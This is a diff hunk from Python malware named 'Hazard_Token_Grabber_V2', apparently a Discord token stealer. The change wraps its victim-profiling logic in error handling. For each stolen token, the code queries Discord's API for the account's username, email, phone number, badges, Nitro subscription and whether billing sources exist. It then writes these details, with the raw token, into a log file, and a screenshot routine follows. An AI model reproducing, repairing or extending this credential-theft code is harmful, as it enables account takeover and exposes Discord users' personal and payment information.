@@ -198,54 +198,56 @@ class Hazard_Token_Grabber_V2:
                 self.saved.append(token)
                 j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                 badges = ""
-                flags = j['flags']
-                if (flags == 1):
-                    badges += "Staff, "
-                if (flags == 2):
-                    badges += "Partner, "
-                if (flags == 4):
-                    badges += "Hypesquad Event, "
-                if (flags == 8):
-                    badges += "Green Bughunter, "
-                if (flags == 64):
-                    badges += "Hypesquad Bravery, "
-                if (flags == 128):
-                    badges += "HypeSquad Brillance, "
-                if (flags == 256):
-                    badges += "HypeSquad Balance, "
-                if (flags == 512):
-                    badges += "Early Supporter, "
-                if (flags == 16384):
-                    badges += "Gold BugHunter, "
-                if (flags == 131072):
-                    badges += "Verified Bot Developer, "
-                if (badges == ""):
-                    badges = "None"
-    
-                user = j["username"] + "#" + str(j["discriminator"])
-                email = j["email"]
-
-                phone = j["phone"] if j["phone"] else "No Phone Number attached"
-                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
-                
                 try:
-                    request.get(url)
+                    flags = j['flags']
+                    if (flags == 1):
+                        badges += "Staff, "
+                    if (flags == 2):
+                        badges += "Partner, "
+                    if (flags == 4):
+                        badges += "Hypesquad Event, "
+                    if (flags == 8):
+                        badges += "Green Bughunter, "
+                    if (flags == 64):
+                        badges += "Hypesquad Bravery, "
+                    if (flags == 128):
+                        badges += "HypeSquad Brillance, "
+                    if (flags == 256):
+                        badges += "HypeSquad Balance, "
+                    if (flags == 512):
+                        badges += "Early Supporter, "
+                    if (flags == 16384):
+                        badges += "Gold BugHunter, "
+                    if (flags == 131072):
+                        badges += "Verified Bot Developer, "
+                    if (badges == ""):
+                        badges = "None"
+
+                    user = j["username"] + "#" + str(j["discriminator"])
+                    email = j["email"]
+
+                    phone = j["phone"] if j["phone"] else "No Phone Number attached"
+                    url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
+
+                    try:
+                        request.get(url)
+                    except:
+                        url = url[:-4]
+
+                    nitro_data = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                    has_nitro = False
+                    has_nitro = bool(len(nitro_data) > 0)
+                    if has_nitro:
+                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                        days = abs((d2 - d1).days)
+                    days_left = days if has_nitro else "0"
+
+                    response = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.getheaders(token))
+
+                    billing = bool(len(json.loads(response.content)) > 0)
                 except:
-                    url = url[:-4]
-
-                nitro_data = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
-                has_nitro = False
-                has_nitro = bool(len(nitro_data) > 0)
-                if has_nitro:
-                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    days = abs((d2 - d1).days)
-                days_left = days if has_nitro else "0"
-
-                response = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.getheaders(token))
-
-                billing = bool(len(json.loads(response.content)) > 0)
-
+                    pass
                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
 
     def screenshot(self):
